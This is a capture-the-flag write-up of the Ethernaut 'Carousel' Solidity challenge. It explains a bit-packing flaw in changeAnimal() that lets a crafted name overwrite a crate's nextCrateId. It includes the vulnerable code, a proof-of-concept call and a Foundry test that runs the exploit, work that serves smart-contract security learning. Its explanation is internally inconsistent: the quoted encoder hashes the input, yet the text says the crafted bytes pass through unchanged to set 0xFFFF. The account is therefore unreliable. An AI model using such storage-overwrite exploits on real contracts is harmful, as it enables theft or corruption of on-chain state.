# Carousel Challenge(Ethernaut)

## Challenge Overview:

The MagicAnimalCarousel contract stores animals in a circular buffer of "crates". Each crate contains three pieces of information packed into a single uint256:

1. owner: 160 bits ([0..159])

2. nextCrateId: 16 bits ([160..175])

3. encodedAnimal: 80 bits ([176..255])

The challenge asks us to break the carousel's "magic rule": that no animal should ever return to crate 1. Our goal is to force a new animal (e.g., "Cat") into crate 1, overwriting the original one (e.g., "Dog").

***Vulnerability***:
 Arbitrary overwriting of the nextCrateId field via an unvalidated animal name in changeAnimal().

**Cause**:
The function changeAnimal(string calldata animal, uint256 crateId) fails to sanitize the middle 16 bits (bits 160–175) of encodedAnimal. This allows an attacker to craft an input where these bits contain a desired nextCrateId value (e.g., 0xFFFF = 65535), which gets stored in the crate directly.

### VulnerabilityCode:
```solidity
// 96 bits allow,it will change the crateId(overwrite the existing ones)
function encodeAnimalName(
        string calldata animalName
    ) public pure returns (uint256) {
        //@audit here length of animal name is only 10 bytes(80 bits) but in carousel it is 12 bytes(96 bits)
        require(bytes(animalName).length <= 12, "Animal name too long");
        return uint256(keccak256(abi.encodePacked(animalName)) >> 160);
    }

// this is change function vulnerability:
 uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // Replace animal
            carousel[crateId] =
                (encodedAnimal << 160) |
                (carousel[crateId] & NEXT_ID_MASK) |
                uint160(msg.sender);
        } else {
            carousel[crateId] = (carousel[crateId] &
                (ANIMAL_MASK | NEXT_ID_MASK));
        }
```
Here, (encodedAnimal << 160) places 96 bits starting from bit 160, which overwrites both nextCrateId (16 bits) and encodedAnimal (80 bits).

There's no masking to preserve the old nextCrateId, so it can be replaced with a custom value.


### ProofofExploit:
```solidity
string memory exploitString = string(
    abi.encodePacked(hex"10000000000000000000FFFF")
);
carousel.changeAnimal(exploitString, 1);

```
1. The crafted input (hex"10000000000000000000FFFF") becomes a "fake" animal name.

2. When passed to encodeAnimalName(), it produces an encoded animal with its lower 16 bits set to 0xFFFF.

3. After << 160, this directly places 0xFFFF into bits 160–175, changing nextCrateId to 65535.


### TestCase:
```solidity
function testBreakMagicRule() public {
    carousel.setAnimalAndSpin("Dog");

    uint256 crate1Data = carousel.carousel(1);
    uint256 animalMask = uint256(type(uint80).max) << 176;
    uint256 encodedDog = uint256(keccak256(abi.encodePacked("Dog"))) >> 176;
    uint256 animalInCrate1 = (crate1Data & animalMask) >> 176;
    assertEq(animalInCrate1, encodedDog, "Crate 1 should contain 'Dog'");

    // Step 2: Exploit to inject 0xFFFF as nextCrateId
    string memory exploitString = string(
        abi.encodePacked(hex"10000000000000000000FFFF")
    );
    carousel.changeAnimal(exploitString, 1);

    // Step 3: Write to crate 65535
    carousel.setAnimalAndSpin("Parrot");
    uint256 crate65535Data = carousel.carousel(65535);
    uint256 encodedParrot = uint256(keccak256(abi.encodePacked("Parrot"))) >> 176;
    uint256 animalInCrate65535 = (crate65535Data & animalMask) >> 176;
    assertEq(animalInCrate65535, encodedParrot, "Crate 65535 should contain 'Parrot'");

    // Step 4: Overwrite crate 1 again
    carousel.setAnimalAndSpin("Cat");
    uint256 updatedCrate1Data = carousel.carousel(1);
    uint256 updatedAnimal = (updatedCrate1Data & animalMask) >> 176;
    assertTrue(updatedAnimal != encodedDog, "Crate 1 should not contain Dog anymore");
}

```
### Summary of this Challenge:

1. Insert "Dog" into crate 1 using setAnimalAndSpin("Dog").

2. Exploit changeAnimal() with a crafted string to overwrite nextCrateId of crate 1 to 65535.

3. Insert "Parrot", which lands in crate 65535 due to tampered nextCrateId.

4. Insert "Cat", which wraps around to crate 1 — breaking the magic rule.

***FinalThoughts of this Challenge***:
Its just understanding the core concets in solidity not real world attack